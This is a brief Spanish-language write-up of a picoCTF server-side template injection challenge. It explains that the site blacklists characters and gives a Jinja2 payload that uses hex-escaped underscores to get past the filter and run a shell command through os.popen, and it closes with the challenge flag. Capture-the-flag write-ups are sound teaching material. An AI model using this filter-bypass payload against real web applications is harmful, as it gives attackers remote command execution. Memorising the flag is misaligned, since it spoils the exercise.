I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:56389/)!

Hints:
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?

## Solución:
Para este reto es igual a el SSTI 1 solo que aqui hay como una lista negra de los strings que son removidos por lo cual unicamente hay que modificar la inyeccion anterior para que lo detecte de otra forma: `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('grep picoCTF . -rnw')|attr('read')()}}` asi obtenemos la flag.

```
# picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
```